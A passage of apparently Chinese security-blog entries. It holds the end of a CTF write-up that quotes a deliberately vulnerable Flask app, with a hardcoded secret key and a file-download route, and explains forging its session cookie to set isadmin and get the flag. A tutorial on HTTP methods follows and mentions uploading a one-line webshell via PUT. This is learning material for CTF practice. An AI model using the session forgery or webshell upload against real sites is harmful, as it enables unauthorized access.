class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/11/07 09:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：抽老婆，哇偶~</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> * <span class="comment"># type: ignore</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getwifi&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getwifi</span>():</span><br><span class="line">    session[<span class="string">&#x27;isadmin&#x27;</span>]=<span class="literal">False</span></span><br><span class="line">    wifi=random.choice(os.listdir(<span class="string">&#x27;static/img&#x27;</span>))</span><br><span class="line">    session[<span class="string">&#x27;current_wifi&#x27;</span>]=wifi</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;getwifi.html&#x27;</span>,wifi=wifi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>(): </span><br><span class="line">    filename=request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;你想干什么？&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> send_file(<span class="string">&#x27;static/img/&#x27;</span>+filename,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret_path_U_never_know&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;isadmin&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:flag&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;你怎么知道这个路径的？不过还好我有身份验证&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析发现，它会根据不同/而调用不同的函数，我们需要使用getflag()函数，输入/secret_path_U_never_know。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220748150.png" alt="image-20240725220748150"></p><p>不行，还要使session[‘isadmin’]为真。（笔记关键词：session）</p><p>用kali机上的flask_session_cookie_manager，先将原session解码，再将isadmin改为True，再编码，替换原session，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725221139596.png" alt="image-20240725221139596"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725221627896.png" alt="image-20240725221627896"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725221646423.png" alt="image-20240725221646423"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http协议</title>
      <link href="/posts/54593785.html"/>
      <url>/posts/54593785.html</url>
      
        <content type="html"><![CDATA[<h1 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h1><h2 id="请求头部"><a href="#请求头部" class="headerlink" title="请求头部"></a>请求头部</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0464489901B424F4BD80FAE602DAA329.png" alt="0464489901B424F4BD80FAE602DAA329"></p><h2 id="响应信息"><a href="#响应信息" class="headerlink" title="响应信息"></a>响应信息</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/88cd158c644c5aab7b118242b20e16c6.jpg" alt=""></p><h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c61e505210b15862655124f3055a1ac2.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/47e6fb5606c0554ef91cb5ee4d216893.jpg" alt=""></p><p>403状态码表示服务请求被禁止，这一类返回码并不代表目标目录真的 无法访问，很多时候是因为攻击者没有命中正确的资源名称。例如， 通常情况下，上传文件往往存储在upload目录下(具体名称并不绝 对)，如果直接访问upload目录，会返回403错误;但如果访问upload 目录下的具体文件，且该文件确实存在，那么返回的HTTP状态码为 200。此外，403错误也可能是因为参数错误而导致的。因此，如果 HTTP返回码为403，并不意味着该文件不存在，还需要进一步处理， 例如在该目录下继续进行目录探测，或者进行参数爆破。</p><h2 id="请求方法（put方法上传一句话木马）"><a href="#请求方法（put方法上传一句话木马）" class="headerlink" title="请求方法（put方法上传一句话木马）"></a>请求方法（put方法上传一句话木马）</h2><p>put方法上传一句话木马，然后用蚁剑链接。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f5448d7940feb1efbdb1c4d7f7d7fce9.jpg" alt=""></p><p>补充：http的请求方法：</p><p>在 HTTP/1.1 中提供了一系列方法以便我们向服务器发送不同类型的请求，需要注意的是这些方法名称都是区分大小写的，而且必需使用大写字母。具体的方法名称和说明如下表所示：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240915140840152.png" alt="image-20240915140840152"></p><ol><li>GET方法<br>GET 方法可以根据请求行中 URL 部分的参数从服务器中获取数据。例如我们在浏览器中打开一个连接，然后就会在浏览器看到相应的页面，这一过程就是通过 GET 方法实现的。另外，使用 GET 方法还可以在 URL 参数中携带一些字符串类型的参数一同传输给服务器，由于是在 URL 中携带的参数，我们可以在浏览器的地址栏直观的看到，所以安全性较低，一般只用来传递一些没有风险的数据。而且 GET 方法对于所传输数据的大小也有限制，一般不能超过 2kb。</li></ol><p>以访问 <a href="http://www.csdn.net/hello.html">http://www.csdn.net/hello.html</a> 这个页面为例，客户端使用 GET 方法发起的 HTTP 请求如下所示：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /hello.html HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: www.csdn.net</span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">84</span>.<span class="number">0</span>.<span class="number">4147</span>.<span class="number">125</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache</span>-Control: no-cache</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b3;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br></pre></td></tr></table></figure><p>针对上面的请求，服务器的响应如下所示：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Tengine</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Thu, 17 Sep 2020 13:07:28 GMT</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>&quot;34aa387-d-1568eb00&quot;</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Authorization,Accept</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line"><span class="attribute">Accept-Ranges</span><span class="punctuation">: </span>bytes</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>68</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Closed</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello，CSDN！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ol><li>HEAD方法<br>HEAD 方法在功能上与 GET 方法相似，不同之处在于使用 HEAD 方法服务器只会返回响应行和响应头，不会返回响应体。同样以访问 <a href="http://c.biancheng.net/hello.html">http://c.biancheng.net/hello.html</a> 这个页面为例，客户端使用 HEAD 方法发起的 HTTP 请求如下所示：</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HEAD</span> /hello.html HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">84</span>.<span class="number">0</span>.<span class="number">4147</span>.<span class="number">125</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Host</span>: www.csdn.net</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br></pre></td></tr></table></figure><p>针对 HEAD 方法发起的请求，服务器的响应如下所示：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Tengine</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Thu, 17 Sep 2020 13:07:28 GMT</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>&quot;34aa387-d-1568eb00&quot;</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Authorization,Accept</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line"><span class="attribute">Accept-Ranges</span><span class="punctuation">: </span>bytes</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Closed</span><br></pre></td></tr></table></figure><p>通过服务器的响应结果可以看出，服务器在返回了响应行和响应头之后，并没有返回响应体。</p><p>3.POST方法<br>当我们需要将一些信息发送给服务器的时候就需要用到 POST 方法了，比如在提交表单或者上传文件的时候。与 GET 方法不同，POST 方法会将返送给服务器的信息放到请求体中，所以比 GET 方法更加安全。而且，POST 方法对于传输数据的大小和类型也没有限制。以提交表单为例，使用 POST 方法向服务器发起的 HTTP 请求如下所示：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>c.biancheng.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>40</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">username</span>=www.csdn.net&amp;password=<span class="number">123456</span></span></span><br></pre></td></tr></table></figure><p>上面的请求发送成功后，服务器端的脚本 login.php 会根据传递的数据做出相应的处理，并对客户端做出响应，响应结果如下所示：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Tengine</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Thu, 17 Sep 2020 13:07:28 GMT</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>&quot;34aa387-d-1568eb00&quot;</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Authorization,Accept</span><br><span class="line"><span class="attribute">Accept-Ranges</span><span class="punctuation">: </span>bytes</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>51</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Closed</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>登陆成功<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ol><li>PUT方法<br>使用 PUT 方法将数据传输到服务器，并将其存储在 URL 所指定的位置。假如我们要将 hello.html 文件的内容存储到服务器的根目录下，那么客户端发送的 HTTP 请求应该是下面这样的：</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/hello.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.csdn.net</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>182</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello，CSDN！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这时服务器会在根目录下创建 hello.html 文件，并将请求中传输的数据保存到这个文件中，执行成功后会向客户端做出如下所示的响应：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">201</span> Created</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Tengine</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Closed</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>The file was created.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ol><li>DELETE方法<br>DELETE 方法可以请求服务器删除 URL 所指定的文件。假如要删除上面操作中在服务器根目录创建的 hello.htnl 文件，那么客户端的请求应该是下面这样的：</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">DELETE</span> /hello.html HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">84</span>.<span class="number">0</span>.<span class="number">4147</span>.<span class="number">125</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Host</span>: www.csdn.net</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br></pre></td></tr></table></figure><p>服务器在收到上面的请求后，会删除根目录下的 hello.html 文件，并对客户端做出如下响应：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Tengine</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Closed</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>URL deleted.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ol><li>CONNECT方法<br>客户端使用 CONNECT 方法可以与 URL 所指向的目标服务器建立 HTTP 连接。假如要与域名（c.biancheng.net）所指向的服务器建立连接，客户端的请求如下所示：</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">CONNECT</span> www.csdn.net HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">84</span>.<span class="number">0</span>.<span class="number">4147</span>.<span class="number">125</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br></pre></td></tr></table></figure><p>连接建立成功后，服务器会对客户端做出如下响应：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">200</span> Connection established</span><br><span class="line"><span class="attribute">Date</span>: Thu, <span class="number">17</span> Sep <span class="number">2020</span> <span class="number">13</span>:<span class="number">32</span>:<span class="number">54</span> GMT</span><br><span class="line"><span class="attribute">Server</span>: Tengine</span><br></pre></td></tr></table></figure><ol><li>OPTIONS方法<br>当我们要使用本节中介绍的某个方法向服务器发送请求，但又不确定服务器是否支持此请求时，可以使用 OPTIONS 方法来查看服务器所支持的 HTTP 方法。在使用 OPTIONS 方法发送 HTTP 请求时，既可以指定具体的 URL，也可以使用星号（*）来代表整个服务器。假如要查看域名（c.biancheng.net）所指向服务器所支持的 HTTP 方法，客户端的请求如下所示：</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">OPTIONS</span> * HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">84</span>.<span class="number">0</span>.<span class="number">4147</span>.<span class="number">125</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br></pre></td></tr></table></figure><p>服务器的响应如下所示：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Tengine</span><br><span class="line"><span class="attribute">Allow</span><span class="punctuation">: </span>GET,HEAD,POST,OPTIONS,TRACE</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>httpd/unix-directory</span><br></pre></td></tr></table></figure><p>在服务器返回的响应头中，Allow 一行就是该服务器支持的所有 HTTP 方法。</p><ol><li>TRACE方法<br>服务器在收到客户端使用 TRACE 方法发送的 HTTP 请求时，会将收到的请求报文放到响应体中返回给客户端。TRACE 方法主要在程序的开发测试阶段使用，使用 TRACE 方法可以查看请求在传递到服务器的过程中是否被篡改或破坏等等。客户端的请求示例如下所示：</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">TRACE</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: www.csdn.net</span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">84</span>.<span class="number">0</span>.<span class="number">4147</span>.<span class="number">125</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br></pre></td></tr></table></figure><p>服务器的响应如下所示：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 17 Sep 2020 13:32:54 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Tengine</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span 